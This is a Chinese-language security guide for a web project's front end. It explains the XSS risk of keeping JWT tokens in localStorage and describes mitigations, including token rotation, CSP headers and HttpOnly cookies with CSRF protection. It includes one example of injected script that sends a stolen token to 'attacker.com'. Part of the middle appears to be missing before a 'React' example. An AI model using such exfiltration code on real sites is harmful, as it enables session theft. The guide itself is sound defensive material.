# 前端认证安全指南

**重要**: 本项目当前使用 `localStorage` 存储 JWT Token，存在 XSS 攻击风险。请阅读本文档了解安全风险和防护措施。

---

## ⚠️ 安全风险警告

### 当前实现

本项目将 Access Token 和 Refresh Token 存储在浏览器的 `localStorage` 中：

```typescript
// src/api/client.ts
const TOKEN_KEY = "qoj.accessToken";

function getToken(): string | null {
  return window.localStorage.getItem(TOKEN_KEY);  // ⚠️ XSS 风险
}
```

### 存在的风险

#### 1. XSS (Cross-Site Scripting) 攻击

如果网站存在 XSS 漏洞，攻击者注入的恶意脚本可以直接读取 `localStorage`：

```javascript
// 攻击者注入的恶意代码
const token = localStorage.getItem("qoj.accessToken");
fetch("https://attacker.com/steal?token=" + token);
```

**后果**: 
- 🔴 攻击者可以窃取用户的 Access Token 和 Refresh Token
- 🔴 攻击者可以冒充用户执行任何操作
- 🔴 即使用户登出，攻击者仍可使用窃取的 Refresh Token

#### 2. Token 泄露风险

- **浏览器扩展**: 恶意浏览器扩展可以读取 `localStorage`
- **第三方脚本**: 加载的第三方 JavaScript 库可能存在漏洞
- **开发者工具**: 任何人打开开发者工具都能看到 Token

## ✅ 防护措施

### 短期措施（已实施）

#### 1. 缩短 Access Token 有效期

```yaml
# 后端配置
qoj:
  jwt:
    access-token-ttl-seconds: 900      # 15 分钟（之前是 2 小时）
    refresh-token-ttl-seconds: 604800  # 7 天
```

**效果**: 即使 Access Token 被窃取，15 分钟后自动失效。

#### 2. Refresh Token 轮换 (Token Rotation)

后端已实现 Refresh Token 轮换机制：

- 每次刷新 Access Token 时，同时签发新的 Refresh Token
- 旧的 Refresh Token 立即失效（加入黑名单）
- 如果检测到旧 Token 重用，撤销整个 Token 家族

**效果**: 如果 Refresh Token 被窃取且被使用，真实用户下次刷新时会触发检测，所有 Token 被撤销。

#### 3. Refresh Token 黑名单

后端使用 Redis 维护 Refresh Token 黑名单：

```java
// 登出时撤销整个 Token 家族
redisTemplate.delete(RedisKeys.refreshTokenFamily(familyId));
```

**效果**: 用户登出后，所有相关 Token 立即失效。

#### 4. 严格的 JWT Secret 验证

```java
// 生产环境强制要求 JWT_SECRET >= 32 字节
if (secretLength < 32 && isProduction) {
    throw new IllegalStateException("JWT_SECRET 长度不足");
}
```

**React 示例**:

```typescript

// ✅ 安全：使用专门的 Markdown 渲染库
import { MarkdownMath } from "@/components/MarkdownMath";
<MarkdownMath value={userInput} />
```

#### 2. 配置 Content Security Policy (CSP)

在后端添加 CSP 响应头：

```java
@Configuration
public class SecurityHeadersConfig {
    @Bean
    public FilterRegistrationBean<CspHeaderFilter> cspFilter() {
        FilterRegistrationBean<CspHeaderFilter> registrationBean = new FilterRegistrationBean<>();
        registrationBean.setFilter(new CspHeaderFilter());
        registrationBean.addUrlPatterns("/*");
        return registrationBean;
    }
}

class CspHeaderFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                   HttpServletResponse response, 
                                   FilterChain filterChain) {
        response.setHeader("Content-Security-Policy",
            "default-src 'self'; " +
            "script-src 'self' 'unsafe-inline'; " +  // 生产环境移除 unsafe-inline
            "style-src 'self' 'unsafe-inline'; " +
            "img-src 'self' data: https:; " +
            "connect-src 'self'; " +
            "frame-ancestors 'none';"
        );
        filterChain.doFilter(request, response);
    }
}
```

#### 3. 添加 Token 刷新逻辑

前端应该在 Access Token 即将过期前自动刷新：

```typescript
// src/api/client.ts

let refreshPromise: Promise<AuthTokenResponse> | null = null;

async function ensureFreshToken(): Promise<string | null> {
  const token = getToken();
  if (!token) return null;

  // 解析 token 检查过期时间
  const payload = parseJwt(token);
  const expiresAt = payload.exp * 1000;
  const now = Date.now();

  // 如果还有 5 分钟以上，直接返回
  if (expiresAt - now > 5 * 60 * 1000) {
    return token;
  }

  // 如果已过期，刷新 token
  if (!refreshPromise) {
    refreshPromise = refreshToken().finally(() => {
      refreshPromise = null;
    });
  }

  const newTokens = await refreshPromise;
  setToken(newTokens.accessToken);
  return newTokens.accessToken;
}
```

### 长期措施（最佳实践）

#### 1. 使用 HttpOnly Cookie

**最安全的方式**: 将 Token 存储在 HttpOnly Cookie 中，JavaScript 无法访问。

**后端修改**:

```java
@PostMapping("/login")
public ApiResponse<Void> login(@RequestBody LoginRequest request, 
                               HttpServletResponse response) {
    AuthTokenResponse tokens = authService.login(request);
    
    // 将 Access Token 放在 HttpOnly Cookie
    Cookie accessCookie = new Cookie("access_token", tokens.accessToken());
    accessCookie.setHttpOnly(true);  // 防止 JavaScript 访问
    accessCookie.setSecure(true);     // 只在 HTTPS 传输
    accessCookie.setPath("/");
    accessCookie.setMaxAge(15 * 60);  // 15 分钟
    response.addCookie(accessCookie);
    
    // Refresh Token 也放在 HttpOnly Cookie
    Cookie refreshCookie = new Cookie("refresh_token", tokens.refreshToken());
    refreshCookie.setHttpOnly(true);
    refreshCookie.setSecure(true);
    refreshCookie.setPath("/api/v1/auth/refresh");  // 限制路径
    refreshCookie.setMaxAge(7 * 24 * 60 * 60);      // 7 天
    response.addCookie(refreshCookie);
    
    return ApiResponse.ok();
}
```

**前端修改**:

```typescript
// 不再需要手动管理 token，浏览器自动发送 cookie
export async function apiGet<T>(url: string): Promise<T> {
  const response = await fetch(url, {
    credentials: 'include',  // 自动发送 cookie
  });
  return parseResponse<T>(response);
}
```

#### 2. 实现 CSRF 防护

使用 HttpOnly Cookie 后，必须防护 CSRF 攻击。

**Double Submit Cookie 模式**:

```java
// 后端：生成 CSRF Token
Cookie csrfCookie = new Cookie("XSRF-TOKEN", csrfToken);
csrfCookie.setHttpOnly(false);  // 允许 JS 读取
csrfCookie.setSecure(true);
csrfCookie.setPath("/");
response.addCookie(csrfCookie);

// 前端：从 Cookie 读取并发送到 Header
const csrfToken = document.cookie.split('; ')
  .find(row => row.startsWith('XSRF-TOKEN='))
  ?.split('=')[1];

fetch(url, {
  headers: {
    'X-XSRF-TOKEN': csrfToken,
  },
  credentials: 'include',
});
```
